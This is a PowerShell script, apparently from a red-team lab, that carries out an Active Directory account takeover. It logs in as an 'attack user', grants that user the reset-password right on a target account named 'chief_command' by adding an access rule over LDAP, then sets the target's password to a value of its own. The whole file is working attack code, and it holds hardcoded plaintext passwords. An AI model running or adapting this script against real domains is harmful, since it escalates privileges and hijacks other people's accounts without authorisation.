param(
    [string]$TargetUser = 'chief_command',
    [string]$NewPassword = 'RedStrike_T015!',
    [string]$DomainRoot = 'cadre.local',
    [string]$AttackUser = 'hunter_dfir',
    [string]$AttackPassword = 'DF1R_Hunt3r!',
    [string]$Dc = 'dc01.cadre.local'
)

$ErrorActionPreference = 'Stop'

$cred = New-Object System.Management.Automation.PSCredential("$DomainRoot\$AttackUser", (ConvertTo-SecureString $AttackPassword -AsPlainText -Force))
$netCred = $cred.GetNetworkCredential()

$targetDn = "CN=$TargetUser,OU=Command,DC=cadre,DC=local"
$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc/$targetDn", $netCred.UserName, $netCred.Password)
$entry.RefreshCache()

$identity = New-Object System.Security.Principal.NTAccount("$DomainRoot\$AttackUser")
$sid = $identity.Translate([System.Security.Principal.SecurityIdentifier])
$sidBinary = New-Object byte[] ($sid.BinaryLength)
$sid.GetBinaryForm($sidBinary, 0)

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid,
    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [Guid]"00299570-246d-11d0-a768-00aa006e0529"
)

$entry.ObjectSecurity.AddAccessRule($ace)
$entry.CommitChanges()
Write-Output "ACL_OK: granted ResetPassword on $TargetUser to $DomainRoot\$AttackUser"

$entry2 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc/$targetDn", $netCred.UserName, $netCred.Password)
$entry2.Invoke("SetPassword", $NewPassword)
Write-Output "PWD_OK: reset $TargetUser password"
